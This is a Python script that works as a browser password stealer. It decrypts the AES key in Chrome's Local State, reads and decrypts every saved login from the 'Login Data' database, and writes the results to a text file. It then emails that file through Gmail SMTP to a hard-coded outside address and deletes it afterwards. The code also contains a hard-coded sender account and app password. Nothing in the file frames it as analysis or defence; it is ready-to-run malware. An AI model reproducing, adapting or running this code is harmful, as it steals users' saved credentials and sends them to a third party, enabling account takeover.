import os
import shutil
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
from datetime import timezone, datetime, timedelta
import smtplib
from email.message import EmailMessage


# create a file to write data to
file = open("chrome-logins.txt", "w")
file.close()

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]

    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""


def main():
    # get the AES key
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterate over all rows
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        
        if username or password:
            # Write to that file we created
            with open("chrome-logins.txt", "a") as f:
                data = f"""
                Origin URL: {origin_url}
                Action URL: {action_url}
                Username: {username}
                Password: {password}
                Creation date: {str(get_chrome_datetime(date_created))}
                Last Used: {str(get_chrome_datetime(date_last_used))}
                """
                f.write(data)
            
        else:
            continue

    cursor.close()
    db.close()
    try:
        # try to remove the copied db file
        os.remove(filename)
    except:
        pass


def send_email():
    main()

    email_sender = "abdulkarimmaslouk4@gmail.com"
    email_password = "uzeikxfcxjejpxmu"
    email_receiver = "musaadrar9@gmail.com"

    subject = "Test 1"
    body = "This is an attachment"

    msg = EmailMessage()
    msg["From"] = email_sender
    msg["To"] = email_receiver
    msg["Subject"] = subject
    msg.set_content(body)

    with open("chrome-logins.txt", "rb") as f:
        file_data = f.read()
        file_name = f.name

    msg.add_attachment(file_data, maintype='application', subtype='octet_stream', filename=file_name)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(email_sender, email_password)
        smtp.send_message(msg)

    # Remove the file
    os.remove("chrome-logins.txt")


if __name__ == "__main__":
    send_email()

